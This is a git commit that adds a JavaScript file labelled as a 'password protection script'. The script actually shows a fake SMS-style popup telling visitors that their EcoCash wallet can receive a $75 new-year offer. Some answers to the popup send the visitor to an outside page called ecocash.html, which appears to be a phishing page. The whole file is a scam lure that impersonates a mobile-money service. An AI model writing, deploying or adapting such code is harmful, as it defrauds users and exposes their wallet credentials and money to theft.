7874fd87adf9ab1dae49a23219494036d7bd1177
ekpanewblog5 <ukpehaitid3@gmail.com>
2025-12-25 15:35:38 +0100

    Create eco-active.js

---
+++ eco-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW $75'
+password = prompt(
+  'SMS: Congratulations! Your ECOCASH Wallet is eligible to receive $75 new year offer. Please press OK to Withdraw.',
+  'WITHDRAW $75'
+);
+if (password != 'WITHDRAW $75') {
+  location.href = 'https://ohfer.org/ecocash.html';
+}
